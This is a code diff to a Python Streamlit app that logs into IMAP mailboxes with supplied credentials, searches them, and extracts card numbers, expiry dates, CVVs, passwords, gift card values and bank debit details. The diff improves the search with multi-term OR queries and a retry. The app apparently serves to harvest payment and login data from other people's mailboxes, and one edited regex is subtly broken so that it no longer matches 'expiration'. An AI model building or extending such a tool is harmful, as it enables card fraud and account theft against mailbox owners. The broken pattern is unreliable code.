@@ -10,7 +10,13 @@ import socket
 from typing import List, Tuple
 from email.header import decode_header
 from email import message_from_bytes
-from hosts import host_list
+
+try:
+    from hosts import host_list
+except ImportError:
+    def host_list(email: str) -> List[str]:
+        domain = email.split("@")[-1].lower() if "@" in email else ""
+        return [f"imap.{domain}"] if domain else ["imap.gmail.com"]
 
 # Page Configuration & Keep-Alive Injector
 st.set_page_config(
@@ -284,13 +290,11 @@ def extract_pins_and_links(text):
 
 
 def extract_credentials_and_cards(text):
-    # Regex for Debit & Credit Cards (Visa, MasterCard, Amex, Discover - 13 to 19 digits formatted or raw)
     card_pattern = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:[0-9]{4}[ -]?){3}[0-9]{4})\b'
     cards = re.findall(card_pattern, text)
     cleaned_cards = [c.replace(" ", "").replace("-", "") for c in cards]
 
-    # Detect Card Details (Expiration Date & CVV/CVC)
-    card_exp = re.findall(r'(?i)(?:exp(?:iry|iration)?|valid thru|exp date)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
+    card_exp = re.findall(r'(?i)(?:exp(?:iry|piration)?|valid thru|exp date)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
     card_cvv = re.findall(r'(?i)(?:cvv2?|cvc|security code|cid)\s*[:=]?\s*(\d{3,4})', text)
     
     formatted_cards = []
@@ -304,30 +308,24 @@ def extract_credentials_and_cards(text):
 
     cred_patterns = re.findall(r'(?i)(?:password|passwd|login|credentials|app password|gift card)\s*[:=]\s*(\S+)', text)
     
-    # Advanced Debit Payment, Tracking & Order Details Detection
     debit_sources = []
     
-    # 1. Bank Debit Alerts
     bank_debits = re.findall(r'(?i)(?:debited by|debit alert|account debited|bank debit|withdrawn from|amt debited)\s*[:=]?\s*([^\n\r,.]+)', text)
     if bank_debits:
         debit_sources.append(f"Bank Debit: {bank_debits[0].strip()}")
         
-    # 2. Online Purchases Debit
     online_debits = re.findall(r'(?i)(?:online purchase|payment to|paid to|merchant|transaction at)\s*[:=]?\s*([^\n\r,.]+)', text)
     if online_debits:
         debit_sources.append(f"Online Purchase Debit: {online_debits[0].strip()}")
         
-    # 3. Card Debit Specific
     card_debits = re.findall(r'(?i)(?:card ending in|card ending|debit card charged|charged to card)\s*[:=]?\s*([^\n\r,.]+)', text)
     if card_debits:
         debit_sources.append(f"Card Debit Source: {card_debits[0].strip()}")
         
-    # 4. Purchase Order Notification & Purchase Confirmation
     orders = re.findall(r'(?i)(?:order confirmation|purchase order|order #|order number|po #)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
     if orders:
         debit_sources.append(f"Order/PO Ref: {orders[0].strip()}")
         
-    # 5. Order Tracking Number
     trackings = re.findall(r'(?i)(?:tracking number|tracking #|track your package|tracking id|shipment tracking)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
     if trackings:
         debit_sources.append(f"Tracking #: {trackings[0].strip()}")
@@ -350,6 +348,19 @@ def clean_boilerplate(text):
     for pat, flags in patterns:
         cleaned = re.sub(pat, "", cleaned, flags=flags)
     return cleaned.strip()
+
+
+def build_imap_or_query(terms: List[str], field_cmd: str) -> str:
+    cleaned_terms = [t.strip() for t in terms if t.strip()]
+    if not cleaned_terms:
+        return f'{field_cmd} ""'
+    if len(cleaned_terms) == 1:
+        return f'{field_cmd} "{cleaned_terms[0]}"'
+
+    query = f'{field_cmd} "{cleaned_terms[-1]}"'
+    for term in reversed(cleaned_terms[:-1]):
+        query = f'OR {field_cmd} "{term}" ({query})'
+    return query
 
 
 def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str], 
@@ -392,12 +403,29 @@ def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_fo
                 typ, data = mail.search(None, "ALL")
             else:
                 field_cmd = search_field if search_field in ("TEXT", "SUBJECT", "FROM", "BODY") else "TEXT"
-                cmd = f'SEARCH {field_cmd} "{clean_query}"'
-                log_func(f"  ├─ [EXECUTING COMMAND] {cmd}")
-                typ, data = mail.search(None, field_cmd, f'"{clean_query}"')
+                terms = clean_query.split()
+                
+                if len(terms) > 1:
+                    or_query = build_imap_or_query(terms, field_cmd)
+                    log_func(f"  ├─ [EXECUTING COMMAND] SEARCH {or_query}")
+                    typ, data = mail.search(None, or_query)
+                    
+                    if typ != "OK" or not (data and data[0]):
+                        log_func("  ├─ [RETRY FALLBACK] Multi-term OR query yielded 0 results or failed. Retrying individual keywords...")
+                        matched_ids_set = set()
+                        for term in terms[:10]:
+                            sub_typ, sub_data = mail.search(None, field_cmd, f'"{term}"')
+                            if sub_typ == "OK" and sub_data and sub_data[0]:
+                                matched_ids_set.update((sub_data[0] or b"").split())
+                        typ = "OK"
+                        data = [b" ".join(sorted(matched_ids_set, key=lambda x: int(x)))]
+                else:
+                    cmd = f'SEARCH {field_cmd} "{clean_query}"'
+                    log_func(f"  ├─ [EXECUTING COMMAND] {cmd}")
+                    typ, data = mail.search(None, field_cmd, f'"{clean_query}"')
 
             log_func(f"  ├─ [IMAP SEARCH RESPONSE] Status: '{typ}' | Raw Bytes: {data}")
-            ids = (data[0] or b"").split() if typ == "OK" else []
+            ids = (data[0] or b"").split() if typ == "OK" and data else []
             total_matched_all_folders += len(ids)
             log_func(f"  ├─ [MATCHES COUNT] Found {len(ids)} message IDs in '{f_label}'.")
 
